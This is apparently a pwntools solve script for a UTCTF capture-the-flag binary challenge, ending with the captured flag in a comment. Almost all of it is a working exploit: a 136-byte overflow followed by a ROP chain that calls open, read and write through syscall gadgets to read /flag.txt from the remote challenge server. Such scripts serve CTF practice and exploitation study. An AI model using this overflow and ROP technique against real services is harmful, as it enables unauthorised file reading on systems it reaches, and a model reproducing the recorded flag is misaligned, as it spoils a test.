#!/usr/bin/env python3

from pwn import *

context( os="linux", arch="amd64" )
elf = ELF( "chal", False )
# libc = ELF( "libc-2.23.so", False )

s = remote( "challenge.utctf.live", 5141 )
# s = remote( "localhost", 9000 )
# s = process(elf.path)


def main():

    rop = ROP(elf)
    buffer = elf.sym.data_start
    rop.read( 0, buffer, 9 )

    rop.rax = 2         # syscall(2) = open
    rop.rdi = buffer    # filename
    rop.rsi = 0         # flags
    rop.rdx = 0         # mode
    rop.raw( rop.find_gadget(['syscall', 'ret']) )

    rop.read(  5, buffer, 64 )
    rop.write( 1, buffer, 64 )


    payload =  cyclic(136)
    payload += rop.chain()
    s.sendline(payload)

    sleep(1)
    s.sendline(b'/flag.txt\x00')
    
    s.interactive()


if __name__ == "__main__":
    main()

# utflag{r0p_with_4_littl3_catch}